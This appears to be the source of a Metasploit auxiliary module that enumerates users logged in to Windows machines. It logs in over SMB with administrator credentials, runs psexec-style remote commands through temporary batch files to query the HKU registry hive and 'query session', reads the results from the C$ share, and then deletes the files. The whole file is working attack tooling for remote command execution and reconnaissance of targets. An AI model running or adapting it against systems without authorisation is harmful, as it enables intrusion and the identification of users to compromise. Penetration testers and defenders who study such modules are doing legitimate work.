##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::SMB::Client::Psexec
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  # Aliases for common classes
  SIMPLE = Rex::Proto::SMB::SimpleClient
  XCEPT  = Rex::Proto::SMB::Exceptions
  CONST  = Rex::Proto::SMB::Constants

  def initialize
    super(
      'Name'        => 'Microsoft Windows Authenticated Logged In Users Enumeration',
      'Description' => %Q{
          This module uses a valid administrator username and password to enumerate users
        currently logged in, using a similar technique than the "psexec" utility provided
        by SysInternals. It uses reg.exe to query the HKU base registry key.
      },
      'Author'      =>
        [
          'Royce Davis @R3dy__ <rdavis[at]accuvant.com>' # Metasploit module
        ],
      'References'  => [
        [ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)
        [ 'OSVDB', '3106'],
        [ 'URL', 'http://www.pentestgeek.com/2012/11/05/finding-logged-in-users-metasploit-module/' ],
        [ 'URL', 'https://docs.microsoft.com/en-us/sysinternals/downloads/psexec' ]
      ],
      'License'     => MSF_LICENSE
    )

    register_options([
      OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
      OptString.new('USERNAME', [false, 'The name of a specific user to search for', '']),
      OptPort.new('RPORT', [true, 'The Target port', 445]),
      OptString.new('WINPATH', [true, 'The name of the Windows directory', 'WINDOWS']),
    ])
  end

  # This is the main controller function
  def run_host(ip)
    cmd = "%SYSTEMDRIVE%\\#{datastore['WINPATH']}\\SYSTEM32\\cmd.exe"
    bat = "%SYSTEMDRIVE%\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
    text = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
    smbshare = datastore['SMBSHARE']

    # Try and authenticate with given credentials
    begin
      connect
      smb_login
    rescue StandardError => autherror
      print_error("#{autherror}")
      return
    end

    keys = get_hku(ip, smbshare, cmd, text, bat)
    if !keys
      cleanup_after(cmd, text, bat)
      disconnect
      return
    end
    keys.each do |key|
      check_hku_entry(key, ip, smbshare, cmd, text, bat)
    end
    cleanup_after(cmd, text, bat)
    disconnect
  end

  # This method runs reg.exe query HKU to get a list of each key within the HKU master key
  # Returns an array object
  def get_hku(ip, smbshare, cmd, text, bat)
    begin
      # Try and query HKU
      command = "#{cmd} /C echo reg.exe QUERY HKU ^> %SYSTEMDRIVE%#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
      out = psexec(command)
      output = get_output(ip, smbshare, text)
      cleanout = Array.new
      output.each_line { |line| cleanout << line.chomp if line.include?("HKEY") && line.split("-").size == 8 && !line.split("-")[7].include?("_")}
      return cleanout
    rescue StandardError => hku_error
      print_error("Error running query against HKU. #{hku_error.class}. #{hku_error}")
      return nil
    end
  end

  # This method will retrieve output from a specified textfile on the remote host
  def get_output(ip, smbshare, file)
    begin
      simple.connect("\\\\#{ip}\\#{smbshare}")
      outfile = simple.open(file, 'ro')
      output = outfile.read
      outfile.close
      simple.disconnect("\\\\#{ip}\\#{smbshare}")
      return output
    rescue StandardError => output_error
      print_error("Error getting command output. #{output_error.class}. #{output_error}.")
      return false
    end
  end

  def report_user(username)
    report_note(
      :host => rhost,
      :proto => 'tcp',
      :sname => 'smb',
      :port => rport,
      :type => 'smb.domain.loggedusers',
      :data => {
        :user => username,
        :status => "Logged in"
      },
      :update => :unique_data
    )
  end

  # This method checks a provided HKU entry to determine if it is a valid SID
  # Either returns nil or returns the name of a valid user
  def check_hku_entry(key, ip, smbshare, cmd, text, bat)
    begin
      key = key.split("HKEY_USERS\\")[1].chomp
      command = "#{cmd} /C echo reg.exe QUERY \"HKU\\#{key}\\Volatile Environment\" ^> %SYSTEMDRIVE%#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
      out = psexec(command)
      if output = get_output(ip, smbshare, text)
        domain, username, dnsdomain, homepath, logonserver = "","","","",""
        # Run this IF loop and only check for specified user if datastore['USERNAME'] is specified
        if datastore['USERNAME'].length > 0
          output.each_line do |line|
            username = line if line.include?("USERNAME")
            domain = line if line.include?("USERDOMAIN")
          end
          if domain.split(" ")[2].to_s.chomp + "\\" + username.split(" ")[2].to_s.chomp == datastore['USERNAME']
            print_good("#{datastore['USERNAME']} is logged in")
            report_user(datastore['USERNAME'])
          end
          return
        end
        output.each_line do |line|
          domain = line if line.include?("USERDOMAIN")
          username = line if line.include?("USERNAME")
          dnsdomain = line if line.include?("USERDNSDOMAIN")
          homepath = line if line.include?("HOMEPATH")
          logonserver = line if line.include?("LOGONSERVER")
        end
        if username.length > 0 && domain.length > 0
          user = domain.split(" ")[2].to_s + "\\" + username.split(" ")[2].to_s
          print_good("#{user}")
          report_user(user.chomp)
        elsif logonserver.length > 0 && homepath.length > 0
          uname = homepath.split('\\')[homepath.split('\\').size - 1]
          if uname.include?(".")
            uname = uname.split(".")[0]
          end
          user = logonserver.split('\\\\')[1].chomp.to_s + "\\" + uname.to_s
          print_good("#{user}")
          report_user(user.chomp)
        else
          username = query_session(smbshare, ip, cmd, text, bat)
          if username
            hostname = (dnsdomain.split(" ")[2] || "").split(".")[0] || "."
            user = "#{hostname}\\#{username}"
            print_good("#{user}")
            report_user(user.chomp)
          else
            print_status("Unable to determine user information for user: #{key}")
          end
        end
      else
        print_status("Could not determine logged in users")
      end
    rescue Rex::Proto::SMB::Exceptions::Error => check_error
      print_error("Error checking reg key. #{check_error.class}. #{check_error}")
      return check_error
    end
  end

  # Cleanup module.  Gets rid of .txt and .bat files created in the #{datastore['WINPATH']}\Temp directory
  def cleanup_after(cmd, text, bat)
    begin
      # Try and do cleanup command
      cleanup = "#{cmd} /C del %SYSTEMDRIVE%#{text} & del #{bat}"
      print_status("Executing cleanup")
      out = psexec(cleanup)
    rescue StandardError => cleanuperror
      print_error("Unable to processes cleanup commands: #{cleanuperror}")
      print_warning("Maybe %SYSTEMDRIVE%#{text} must be deleted manually")
      print_warning("Maybe #{bat} must be deleted manually")
      return cleanuperror
    end
  end

  # Method tries to use "query session" to determine logged in user
  def query_session(smbshare, ip, cmd, text, bat)
    begin
      command = "#{cmd} /C echo query session ^> %SYSTEMDRIVE%#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
      out = psexec(command)
      userline = ""
      if output = get_output(ip, smbshare, text)
        output.each_line { |line| userline << line if line[0] == '>' }
      else
        return nil
      end
      return userline.split(" ")[1].chomp
    rescue
      return nil
    end
  end
end
